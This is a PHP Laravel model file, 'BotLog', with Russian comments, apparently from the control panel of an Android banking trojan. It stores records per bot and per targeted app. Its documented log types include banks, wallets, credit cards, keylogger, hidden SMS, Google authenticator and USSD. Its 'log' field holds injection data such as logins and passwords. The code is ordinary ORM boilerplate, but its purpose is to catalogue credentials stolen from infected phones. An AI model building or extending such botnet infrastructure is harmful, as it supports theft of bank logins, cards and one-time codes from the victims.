<?php

namespace App\Models;

use Eloquent;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\HasOne;
use Illuminate\Support\Carbon;

/**
 * App\Models\BotLog
 *
 * @property int $id
 * @property string $bot_id
 * @property string|null $application Название пакета приложения. Пример: org.app.name. Необязательный параметр
 * @property string $type Тип лога. Доступные типы: 'banks', 'crypt', 'wallets', 'shops', 'credit_cards', 'emails', 'sms', 'events', 'googleauth', 'hidesms', 'keylogger', 'mail', 'otheraccounts', 'phonenumber', 'pushlist', 'ussd'
 * @property array $log JSON массив с данными инжекта, в любом формате. {"login": "log", "password": "pass", ...}
 * @property Carbon|null $created_at
 * @property Carbon|null $updated_at
 * @property string|null $comment
 * @method static \Database\Factories\BotLogFactory factory(...$parameters)
 * @method static \Illuminate\Database\Eloquent\Builder|BotLog newModelQuery()
 * @method static \Illuminate\Database\Eloquent\Builder|BotLog newQuery()
 * @method static \Illuminate\Database\Eloquent\Builder|BotLog query()
 * @method static \Illuminate\Database\Eloquent\Builder|BotLog whereApplication($value)
 * @method static \Illuminate\Database\Eloquent\Builder|BotLog whereBotId($value)
 * @method static \Illuminate\Database\Eloquent\Builder|BotLog whereCreatedAt($value)
 * @method static \Illuminate\Database\Eloquent\Builder|BotLog whereId($value)
 * @method static \Illuminate\Database\Eloquent\Builder|BotLog whereLog($value)
 * @method static \Illuminate\Database\Eloquent\Builder|BotLog whereType($value)
 * @method static \Illuminate\Database\Eloquent\Builder|BotLog whereUpdatedAt($value)
 * @mixin Eloquent
 */
class BotLog extends Model
{
    use HasFactory;

    protected $casts = [
        'log' => 'array',
    ];

    protected $fillable = [
        'bot_id',
        'application',
        'type',
        'log',
        'comment',
    ];

    public function injection(): HasOne
    {
        return $this->hasOne(Injection::class, 'application', 'application');
    }
}
